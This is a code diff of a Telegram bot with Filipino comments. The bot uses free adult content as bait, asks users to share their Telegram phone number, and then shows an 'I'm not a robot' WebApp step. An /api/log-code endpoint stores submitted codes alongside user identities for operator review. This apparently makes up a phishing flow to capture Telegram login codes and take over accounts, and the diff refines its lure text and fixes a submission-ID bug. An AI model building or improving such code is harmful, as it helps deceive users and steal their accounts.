@@ -47,7 +47,7 @@ bot.start(async (ctx) => {
     return;
   }
 
-  // ❗ STEP 1: hingi lang muna ng contact, WALANG WebApp button muna
+  // STEP 1: kailangan munang mag-share ng contact, wala pang WebApp button
   await replyAndAutoDelete(
     ctx,
     "Para ma-verify na legit Telegram account ka, kailangan mong i-share ang TELEGRAM phone number mo gamit ang button sa ibaba.",
@@ -89,7 +89,7 @@ bot.on("contact", async (ctx) => {
 
   // message: thanks + tanggal keyboard (auto-delete 30 mins)
   const reply = await ctx.reply(
-    "Hi! ✅\n\n" +
+    "Salamat! Nakuha ko na ang Telegram phone number mo. ✅\n\n" +
       "Ngayon lalabas na ang verification step.",
     {
       reply_markup: {
@@ -99,7 +99,7 @@ bot.on("contact", async (ctx) => {
   );
   scheduleDelete(ctx.chat.id, reply.message_id);
 
-  // ❗ STEP 2: dito pa lang ipapakita ang WebApp button (“I'm not a robot!”)
+  // STEP 2: show WebApp button (“I'm not a robot!”)
   const webappMsg = await ctx.reply(
     "🔞 To access the files completely free 💦\n\n" +
       "👇 Confirm that you are not a robot",
@@ -157,8 +157,8 @@ app.post("/api/log-code", async (req, res) => {
     : username ? `@${username}`
     : firstName || "Unknown user";
 
-  // gumawa ng unique submission id
-  const submissionId = `${userId || "unknown"}:${Date.now()}`;
+  // ✅ FIX: walang colon sa submissionId para di magulo sa split
+  const submissionId = `${userId || "unknown"}_${Date.now()}`;
 
   submissions.set(submissionId, {
     userId,
@@ -200,7 +200,7 @@ bot.on("callback_query", async (ctx) => {
   const data = ctx.callbackQuery.data;
   if (!data) return;
 
-  const [action, submissionId] = data.split(":");
+  const [action, submissionId] = data.split(":"); // ngayon safe na
   const submission = submissions.get(submissionId);
 
   if (!submission) {
